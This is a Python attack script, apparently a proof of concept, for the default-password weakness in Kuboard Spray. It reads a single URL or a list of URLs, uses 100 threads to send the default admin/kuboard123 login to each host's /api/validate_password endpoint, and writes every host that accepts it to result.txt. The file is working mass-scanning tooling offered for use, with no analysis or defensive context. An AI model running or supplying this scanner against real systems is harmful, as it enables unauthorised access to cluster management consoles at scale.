#Kuboard Spray弱口令漏洞
import requests,sys,argparse,re,json
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
     test="""  _  __     _                         _ 
 | |/ /    | |                       | |
 | ' /_   _| |__   ___   __ _ _ __ __| |
 |  <| | | | '_ \ / _ \ / _` | '__/ _` |
 | . \ |_| | |_) | (_) | (_| | | | (_| |
 |_|\_\__,_|_.__/ \___/ \__,_|_|  \__,_|
                                        
                                        

 """
     print(test)

def main():
    banner()
    parsers=argparse.ArgumentParser(description='Kuboard Spray弱口令漏洞')
    parsers.add_argument('-u','--url',dest='url',type=str,help='please input your url')
    parsers.add_argument('-f','--file',dest='file',type=str,help='please input your filepath')
    args=parsers.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp=Pool(100)
        #mp.map(poc, url_list) 的作用是并行地对 url_list 中的每个 URL 执行 poc 函数（或方法）
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"usag:\n\t python {sys.argv[0]} -h")
def poc(target):
    payload='/api/validate_password'
    headers = {
        'User-Agent':'Mozilla/5.0(WindowsNT10.0;Win64;x64;rv:128.0)Gecko/20100101Firefox/128.0',
        'Accept':'application/json,text/plain,*/*',
        'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding':'gzip,deflate',
        'Content-Type':'application/json',
        'Authorization':'Bearerundefined',
        'Content-Length':'44',
        'Connection':'close',
        'Priority':'u=0',

    }
    data={"username":"admin","password":"kuboard123"}
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
   
    try:
        res1=requests.post(url=target+payload,headers=headers,proxies=proxies,verify=False,json=data)
        res2=json.loads(res1.text)
        if res1.status_code==200 and res2['data']=='success':
                    print(f"[+]目标存在 {target}")
                    with open('result.txt','a') as f:
                        f.write(target+'\n')
    except:
        pass


if __name__ == '__main__':
    main()
